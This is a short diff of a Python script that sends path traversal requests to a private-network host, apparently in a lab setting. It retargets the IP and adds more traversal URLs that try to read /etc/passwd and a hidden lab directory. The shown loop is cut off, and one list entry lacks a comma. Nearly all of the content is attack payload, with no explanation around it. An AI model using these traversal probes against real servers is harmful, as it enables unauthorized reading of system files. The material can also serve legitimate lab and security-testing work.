@@ -1,6 +1,6 @@
 import requests
 
-target_url = "http://192.168.1.101"
+target_url = "http://192.168.1.102"
 
 test_urls = [
     f"{target_url}/../../etc/passwd/foo.txt",
@@ -8,7 +8,9 @@ test_urls = [
     f"{target_url}/../../../../etc/passwd/foo.txt"
     f"{target_url}/../../opt/lab/hidden/foo.txt",
     f"{target_url}/../../../opt/lab/hidden/foo.txt",
-    f"{target_url}/../../../../opt/lab/hidden/foo.txt"
+    f"{target_url}/../../../../opt/lab/hidden/foo.txt",
+    f"{target_url}/../opt/lab/hidden/foo.txt",
+    f"{target_url}/opt/lab/hidden/foo.txt",
 ]
 
 for url in test_urls:
